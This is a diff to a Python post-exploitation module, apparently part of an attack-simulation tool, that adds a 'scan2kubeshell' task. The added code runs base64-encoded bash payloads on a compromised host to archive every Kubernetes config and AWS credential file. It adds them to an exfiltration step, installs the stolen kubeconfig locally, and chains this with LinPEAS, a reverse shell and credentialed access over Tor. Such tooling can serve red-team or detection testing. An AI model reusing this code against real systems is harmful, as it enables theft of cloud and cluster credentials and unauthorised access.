@@ -134,8 +134,18 @@ class Module(BaseModule):
                         cwd="/tmp")
                     log(result)
 
+                # create an archive of all kube creds
+                payload = base64.b64encode(
+                    b'tar -czvf /tmp/kube_creds.tgz -C / $(find / \( -type f -a \( -name \'config\' -a -path \'*.kube\' \) \)  -printf \'%P\n\')')
+                log("payload loaded and ready")
+                result = session.platform.run(
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_kubecreds | base64 -d | /bin/bash'",
+                    cwd="/tmp")
+                log(result)
+
                 # copy files
                 files = [f"/tmp/{csp}_creds.tgz",
+                         "/tmp/kube_creds.tgz",
                          "/tmp/linpeas.txt",
                          "/tmp/instance_access_token.json",
                          "/tmp/instance_metadata.json"]
@@ -211,7 +221,7 @@ class Module(BaseModule):
                 except Exception as e:
                     log(f'Error executing bash script: {e}')
 
-            def prep_local_env(csp, task_name):
+            def prep_local_env(task_name, csp=None):
                 # create work directory
                 task_path = Path(f"/{task_name}")
                 if task_path.exists() and task_path.is_dir():
@@ -255,9 +265,8 @@ class Module(BaseModule):
                     # ~/.config/gcloud/credentials.json
                     gcp_dir = Path.joinpath(
                         Path.home(), Path(".config"), Path("gcloud"))
-                    if gcp_dir.exists() and gcp_dir.is_dir():
-                        shutil.rmtree(gcp_dir)
-                    gcp_dir.mkdir(parents=True)
+                    if not gcp_dir.exists():
+                        gcp_dir.mkdir(parents=True)
 
                     # extract the first set gcp creds
                     file = tarfile.open(f'/tmp/{hostname}_gcp_creds.tgz')
@@ -275,6 +284,18 @@ class Module(BaseModule):
                 linpeas = Path(f'/tmp/{hostname}_linpeas.txt')
                 shutil.copy2(linpeas, task_path)
 
+                # extract the kube config
+                kube_dir = Path.joinpath(
+                    Path.home(), Path(".kube"))
+                if not kube_dir.exists():
+                    kube_dir.mkdir(parents=True)
+                file = tarfile.open(f'/tmp/{hostname}_kube_creds.tgz')
+                for m in file.members:
+                    if m.isfile() and (m.path.endswith('/.kube/config')):
+                        file.extract(m.path, task_path)
+                        shutil.copy2(Path.joinpath(
+                            task_path, m.path), Path.joinpath(kube_dir, os.path.basename(m.path)))
+
             # get hostname for disk loggings
             hostname = session.platform.getenv('HOSTNAME')
 
@@ -291,7 +312,7 @@ class Module(BaseModule):
                 exfiltrate(csp)
                 log("exfiltrate complete")
                 log("running prep_local_env...")
-                prep_local_env(csp, task_name)
+                prep_local_env(csp=csp, task_name=task_name)
                 log("prep_local_env complete")
                 log("running credentialed_access_tor...")
                 credentialed_access_tor(
@@ -311,7 +332,7 @@ class Module(BaseModule):
                 exfiltrate(csp)
                 log("exfiltrate complete")
                 log("running prep_local_env...")
-                prep_local_env(csp, task_name)
+                prep_local_env(csp=csp, task_name=task_name)
                 log("prep_local_env complete")
                 log("running credentialed_access_tor...")
                 credentialed_access_tor(
@@ -389,6 +410,33 @@ class Module(BaseModule):
                 if session.platform.Path('/tmp/sockskey').exists():
                     session.platform.unlink('/tmp/sockskey')
             elif task_name == "scan2kubeshell":
+                csp = "aws"
+                log("running enumerate...")
+                enumerate()
+                log("enumerate complete")
+                log("running exfiltrate...")
+                exfiltrate("aws")
+                log("exfiltrate complete")
+                log("running prep_local_env...")
+                prep_local_env(csp=csp, task_name=task_name)
+                log("prep_local_env complete")
+                log("running credentialed_access_tor...")
+                credentialed_access_tor(
+                    csp,
+                    task_name,
+                    f'/{task_name}',
+                    f'{task_name}.sh'
+                )
+                log("credentialed_access_tor complete")
+
+                # create an archive of all kubernetes creds
+                payload = base64.b64encode(
+                    b'tar -czvf /tmp/aws_creds.tgz -C / $(find / \( -type f -a \( -name \'credentials\' -a -path \'*.aws/credentials\' \) -o \( -name \'config\' -a -path \'*.aws/config\' \) \)  -printf \'%P\n\')')
+                log("payload loaded and ready")
+                result = session.platform.run(
+                    f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_awscreds | base64 -d | /bin/bash'",
+                    cwd="/tmp", timeout=900)
+                log(result)
                 # - reverse shell executes linpeas and pulls back aws credentials
                 # - use credentials to call aws eks list-clusters and find our cluster
                 # - use credentials to call aws eks update-kubeconfig --name=<cluster>
